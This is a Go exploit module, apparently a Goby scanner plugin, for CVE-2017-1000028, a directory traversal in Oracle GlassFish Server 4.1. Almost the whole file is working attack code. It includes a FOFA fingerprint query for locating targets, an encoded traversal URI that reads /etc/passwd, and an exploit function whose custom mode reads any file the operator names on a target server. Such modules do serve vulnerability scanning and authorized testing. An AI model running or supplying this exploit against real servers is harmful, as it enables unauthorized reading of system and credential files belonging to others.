package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Oracle GlassFish Server Open Source Edition Directory Traversal  Vulnerability（CVE-2017-1000028）",
    "Description": "<p>Oracle GlassFish Server Open Source Edition is an open source version of Oracle's server for building Java EE(server-side Java applications). </p><p>Oracle GlassFish Server Open Source Edition4.1 has an arbitrary file read vulnerability. An attacker could exploit the vulnerability to access sensitive data with a specially crafted HTTP GET request.</p>",
    "Product": "Oracle GlassFish Server Open Source Edition",
    "Homepage": "https://www.oracle.com/middleware/technologies/glassfish-server.html",
    "DisclosureDate": "2017-07-13",
    "PostTime": "2024-07-11",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"glassfish\" && body=\"/theme/com/sun\"",
    "GobyQuery": "body=\"glassfish\" && body=\"/theme/com/sun\"",
    "Level": "1",
    "Impact": "<p>Oracle GlassFish Server Open Source Edition4.1 has an arbitrary file read vulnerability. An attacker could exploit the vulnerability to access sensitive data with a specially crafted HTTP GET request.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:<a href=\"http://www.oracle.com/\">http://www.oracle.com/</a></p>",
    "References": [
        "https://www.exploit-db.com/exploits/45198"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "/etc/passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Priority": "u=4",
                    "Te": "trailers",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Priority": "u=4",
                    "Te": "trailers",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2017-1000028"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "Oracle GlassFish Server Open Source Edition 目录遍历漏洞 （CVE-2017-1000028）",
            "Product": "Oracle GlassFish Server Open Source Edition",
            "Description": "<p>Oracle GlassFish Server Open Source Edition是美国甲骨文(Oracle)公司的一套开源版本的用于构建Java EE(服务器端Java应用程序)的服务器。<br></p><p>Oracle GlassFish Server Open Source Edition4.1版本中存在任意文件读取漏洞。攻击者可借助特制的HTTP GET请求利用该漏洞访问敏感数据。<br></p>",
            "Recommendation": "<p>厂商尚未提供漏洞修复方案，请关注厂商主页更新：<a href=\"http://www.oracle.com/\">http://www.oracle.com/</a><br></p>",
            "Impact": "<p>Oracle GlassFish Server Open Source Edition4.1版本中存在任意文件读取漏洞。攻击者可借助特制 的HTTP GET请求利用该漏洞访问敏感数据。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Oracle GlassFish Server Open Source Edition Directory Traversal  Vulnerability（CVE-2017-1000028）",
            "Product": "Oracle GlassFish Server Open Source Edition",
            "Description": "<p>Oracle GlassFish Server Open Source Edition is an open source version of Oracle's server for building Java EE(server-side Java applications).&nbsp;</p><p>Oracle GlassFish Server Open Source Edition4.1 has an arbitrary file read vulnerability. An attacker could exploit the vulnerability to access sensitive data with a specially crafted HTTP GET request.<br></p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:<a href=\"http://www.oracle.com/\">http://www.oracle.com/</a><br></p>",
            "Impact": "<p>Oracle GlassFish Server Open Source Edition4.1 has an arbitrary file read vulnerability. An attacker could exploit the vulnerability to access sensitive data with a specially crafted HTTP GET request.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10969"
}`

	postOrGet_vn2iN5NuuN2M3HSN := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Sl-Ce-Suid":      "29",
			"Accept-Encoding": "gzip, deflate, br",
		}
		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody

		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := `/theme/META-INF/`
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd": "root:"}
			// 函数继承
			uploadFileFunc := postOrGet_vn2iN5NuuN2M3HSN

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				`/etc/passwd`: {`/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`, `root:`},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_vn2iN5NuuN2M3HSN

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
